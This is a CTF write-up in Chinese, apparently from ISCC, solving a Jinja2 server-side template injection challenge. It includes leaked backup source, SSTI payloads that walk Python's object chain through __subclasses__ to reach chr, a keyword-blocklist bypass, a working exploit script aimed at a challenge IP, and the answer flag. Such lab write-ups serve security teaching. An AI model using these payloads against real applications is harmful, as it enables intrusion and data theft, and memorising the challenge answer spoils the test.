
## Solution

### Step 1: 源码泄露与框架确认

在浏览器中打开靶机首页，能够从页面源码里发现如下注释信息：

```html
<!-- notes: index.php.bak, app.py.bak -->
```

经测试发现，上述提及的备份文件并未存放在网站根路径下，其真实访问路径为：

```text
/backup/index.php.bak
/backup/app.py.bak
```

审查 `app.py.bak` 文件的内容，可以发现服务端在后台定义了一个包含各类信息的 `doc` 数据字典：

```python
def build_doc():
    return {
        'title': '关于进一步规范企业公文套红预览流程的通知',
        'department': '企业信息化办公室',
        'doc_no': '信办发〔2026〕12号',
        'date': '2026-02-24',
        'summary': '预览服务仅用于内部版式核对，正式发文前仍需复核内容与编号。',
        'flag': '*+*+*+*'
    }
```

而在 `index.php.bak` 源码里，留有一段非常重要的思路指引：

```php
$compat_note = "输入内容一定要按照模板来，有一套模板就足够了；如果字符显示出了问题，还是按老办法从空字符串对象''一路往上看，不要投机取巧跳过步骤，按最基本的来就行。";
```

另外，通过抓包查看 HTTP 响应头，可以观察到 Server 字段包含了 Werkzeug/Python 字样，由此可判定目标系统采用了 Python 作为其后端 Web 架构。

### Step 2: 验证模板表达式

向 `/preview` 接口发起 POST 形式的请求，并传入名为 `tpl` 的参数以测试漏洞。

首先尝试读取非敏感的常规键值：

```jinja2
{{doc.get('title')}}
```

此时页面能正常回显公文的标题内容：

```text
关于进一步规范企业公文套红预览流程的通知
```

接着尝试直接获取 flag 的值：

```jinja2
{{doc.get('flag')}}
```

发现请求遭到了后端的阻断，这表明服务器端确实配置了针对 `flag` 这一关键词的拦截策略。

### Step 3: 利用对象链绕过黑名单

遵照前文所获源码里的线索，我们以空字符串 `''` 为起点逐步向上层基类进行回溯：

```jinja2
{{''.__class__.__base__.__subclasses__()}}
```

在回显的所有子类列表当中，能够找到一个较为特别的类名：

```text
BuiltinBridge
```

该类刚好处于 `__subclasses__()` 返回数组的索引 117 处。我们进一步利用它来提取其初始化方法内的全局命名空间：

```jinja2
{{''.__class__.__base__.__subclasses__()[117].__init__.__globals__}}
```

页面将返回如下的内置属性结果：

```python
{'__builtins__': {'chr': <built-in function chr>}}
```

这意味着我们成功获取到了内置函数 `chr` 的调用权限。借助 `chr()` 函数将 ASCII 码转换为字符的特性，我们就能在不触发敏感词检测的前提下，动态组装出所需的 `flag` 字符串，进而完美避开对明文 `flag` 的限制。

能够实现上述漏洞利用全过程的 Python 脚本代码如下所示：

```python
import html
import re

import requests


url = "http://39.105.213.28:49104/preview"

chain = "''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['chr']"

payload = "{{doc.get(%s(102)+%s(108)+%s(97)+%s(103))}}" % (
    chain,
    chain,
    chain,
    chain,
)

resp = requests.post(url, data={"tpl": payload}, timeout=10)
match = re.search(r"<pre>(.*?)</pre>", resp.text, re.S)

print(html.unescape(match.group(1)).strip())
```

在该脚本中，对应的字符 ASCII 码转换关系为：

```python
chr(102) == "f"
chr(108) == "l"
chr(97) == "a"
chr(103) == "g"
```

因此，经过转换后的 payload 最终发挥的作用等同于执行了如下代码：

```python
doc.get("flag")
```

运行该脚本，即可得到目标输出：

```text
ISCC{enterprise_red_doc_preview}
```
